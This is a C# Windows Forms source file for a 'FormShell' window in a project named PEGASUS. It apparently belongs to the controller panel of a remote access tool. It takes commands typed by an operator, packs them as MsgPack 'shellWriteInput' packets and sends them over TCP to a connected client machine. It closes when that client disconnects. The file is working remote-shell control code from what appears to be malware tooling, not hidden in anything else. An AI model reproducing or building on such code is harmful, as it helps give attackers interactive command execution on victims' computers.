using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormShell : Form
    {
        public FormShell()
        {
            InitializeComponent();
        }

        public PEGALISIUS F { get; set; }
        internal Clients Client { get; set; }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (Client != null)
                if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
                {
                    if (textBox1.Text == "cls".ToLower())
                    {
                        richTextBox1.Clear();
                        textBox1.Clear();
                    }

                    if (textBox1.Text == "exit".ToLower()) Close();
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
                    msgpack.ForcePathObject("WriteInput").AsString = textBox1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    textBox1.Clear();
                }
        }

        private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
            msgpack.ForcePathObject("WriteInput").AsString = "exit";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected) Close();
            }
            catch
            {
                Close();
            }
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }
    }
}